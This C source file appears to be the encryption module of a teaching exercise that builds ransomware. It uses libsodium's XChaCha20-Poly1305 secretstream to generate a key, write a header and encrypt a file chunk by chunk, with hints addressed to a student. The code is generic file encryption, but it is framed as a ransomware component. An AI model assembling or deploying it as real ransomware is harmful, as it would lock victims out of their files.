#include "ransom.h"
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <sodium/utils.h>
#include <stdio.h>
#include <stdlib.h>

/*
** Here, you have to open both files with different permissions : think of what you want to
** to do with each file. Don't forget to check the return values of your syscalls !
*/
bool init_encryption(FILE **to_encrypt, FILE **encrypted,
    const char *filepath, const char *optfilepath)
{
     if (!(*to_encrypt = fopen(filepath, "rb"))
                || !(*encrypted = fopen(optfilepath, "wb"))) {
            perror("fopen in init_encryption");
            return EXIT_FAILURE;
        }
        return EXIT_SUCCESS;
}

/*
** I strongly advise to code near the sources/decryption.c code : it is the opposite process.
** Here, you have to initialize the header, then write it in the encrypted file.
*/
int write_header(unsigned char *generated_key, FILE **to_encrypt,
    FILE **encrypted, crypto_secretstream_xchacha20poly1305_state *st)
{
unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];

    crypto_secretstream_xchacha20poly1305_keygen(generated_key);

    if (crypto_secretstream_xchacha20poly1305_init_push(
            st, header, generated_key)) {
        perror("crypto_secretstream_xchacha20poly1305_init_push");
        return EXIT_FAILURE;
    }

    if (fwrite(header, 1, sizeof(header), *encrypted) != sizeof(header)) {
        perror("fwrite header");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

/*
** The encryption loop really looks the same than the decryption one.
** In decryption_loop, the crypto_secretstream_xchacha20poly1305_pull is used to retrieve data.
** Think of the opposite of "pull" things... The link provided in the README.md about libsodium
** should really help you.
*/
int encryption_loop(FILE *to_encrypt, FILE *encrypted,
    crypto_secretstream_xchacha20poly1305_state st)
{
    unsigned char in[CHUNK_SIZE];
    unsigned char out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned long long out_len = 0;
    size_t read_len = 0;
    int eof = 0;
    unsigned char tag = 0;

    do {
        read_len = fread(in, 1, sizeof(in), to_encrypt);
        eof = feof(to_encrypt);

        tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL :
                    crypto_secretstream_xchacha20poly1305_TAG_MESSAGE;

        if (crypto_secretstream_xchacha20poly1305_push(&st, out, &out_len,
            in, read_len, NULL, 0, tag)) {
            perror("Corrupted chunk during encryption.");
            return EXIT_FAILURE;
        }

        if (fwrite(out, 1, (size_t)out_len, encrypted) != (size_t)out_len) {
            perror("fwrite encrypted chunk");
            return EXIT_FAILURE;
        }

    } while (!eof);

    return EXIT_SUCCESS;
}
